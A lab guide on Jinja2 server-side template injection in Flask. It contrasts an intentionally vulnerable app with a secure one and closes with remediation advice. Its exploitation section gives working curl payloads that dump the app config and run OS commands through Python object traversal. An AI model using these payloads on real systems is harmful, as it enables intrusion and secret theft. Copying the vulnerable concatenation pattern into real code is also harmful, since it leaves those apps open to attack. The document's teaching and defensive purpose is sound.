# Server-Side Template Injection (SSTI) Lab

A comprehensive guide and reference implementation demonstrating Server-Side Template Injection (SSTI) in Python/Flask (Jinja2), comparing vulnerable vs. secure implementations, exploitation pathways to Remote Code Execution (RCE), and remediation best practices.

---

## 1. Architecture & Port Mapping

| Port | Service | Vulnerability Status | Pattern |
| :--- | :--- | :--- | :--- |
| `3001` | Vulnerable Flask Service | **VULNERABLE** | Dynamic string concatenation into template string |
| `3002` | Secure Flask Service | **SECURE** | Static template string with context parameterization |

---

## 2. Source Code

### Vulnerable Implementation (`app_vuln.py` - Port 3001)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

@app.route("/")
def index():
    name = request.args.get("name", "world")
    # VULNERABLE: user input rendered directly as template source
    return render_template_string("<h2>Hello " + name + "</h2>")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3001)
```

---

### Secure Implementation (`app_safe.py` - Port 3002)

```python
from flask import Flask, request, render_template_string

app = Flask(__name__)

PAGE = "<h2>Hello {{ name }}</h2>"

@app.route("/")
def index():
    name = request.args.get("name", "world")
    # SAFE: user input passed as data/context, not template source
    return render_template_string(PAGE, name=name)

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=3002)
```

---

## 3. Vulnerability Analysis

### Root Cause
In `app_vuln.py`, the user parameter `name` is concatenated directly into the template string argument of `render_template_string()`:

```python
render_template_string("<h2>Hello " + name + "</h2>")
```

When Jinja2 compiles the template, any template syntax markers (`{{ ... }}`, `{% ... %}`) provided in the `name` parameter are treated as native template instructions rather than plain text data.

### Impact
- **Information Disclosure:** Read environment variables, configuration secrets (`SECRET_KEY`), and database connection strings via `{{ config }}`.
- **Remote Code Execution (RCE):** Traversal through Python's object model (`__class__`, `__mro__`, `__globals__`, or `__subclasses__()`) allows invoking operating system commands via modules such as `os` or `subprocess`.

---

## 4. Exploitation & Verification

### Step 1: Verification (Reconnaissance)

Test whether the template engine evaluates expressions:

```bash
# Target vulnerable service (port 3001):
curl "http://localhost:3001/?name={{7*7}}"
# Response: <h2>Hello 49</h2>

# Target safe service (port 3002):
curl "http://localhost:3002/?name={{7*7}}"
# Response: <h2>Hello {{7*7}}</h2>
```

---

### Step 2: Context Inspection

Inspect application configuration and stored secrets:

```bash
curl "http://localhost:3001/?name={{config.items()}}"
```

---

### Step 3: Remote Code Execution (RCE)

Traverse `config` to access `os.popen()`:

```bash
# Execute 'id' command
curl "http://localhost:3001/?name={{config.__class__.__init__.__globals__['os'].popen('id').read()}}"

# Output:
# <h2>Hello uid=1000(lab) gid=1000(lab) groups=1000(lab)</h2>
```

Alternative generic payload via Python subclass traversal (if `config` is stripped or restricted):

```bash
curl "http://localhost:3001/?name={{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}"
```

---

## 5. Remediation

### Core Fix: Context Parameterization
Never assemble template strings by concatenating untrusted user input. Keep template structures static and pass user inputs strictly as keyword arguments (context data):

```python
# CORRECT
PAGE = "<h2>Hello {{ name }}</h2>"
return render_template_string(PAGE, name=name)
```

### Defense-in-Depth Recommendations

1. **Use Dedicated File Templates:**
   Prefer `render_template("index.html", name=name)` over `render_template_string()`. Static template files enforce separation between code structure and runtime variables.

2. **Template Sandboxing:**
   If user-supplied templates are an unavoidable business requirement, evaluate them with `jinja2.sandbox.SandboxedEnvironment`, intercepting dangerous attribute calls (`__class__`, `__globals__`, `__subclasses__`).

3. **Process Isolation:**
   Execute application containers as unprivileged users (`USER nonroot`) on read-only root filesystems to limit the impact of potential RCE exploits.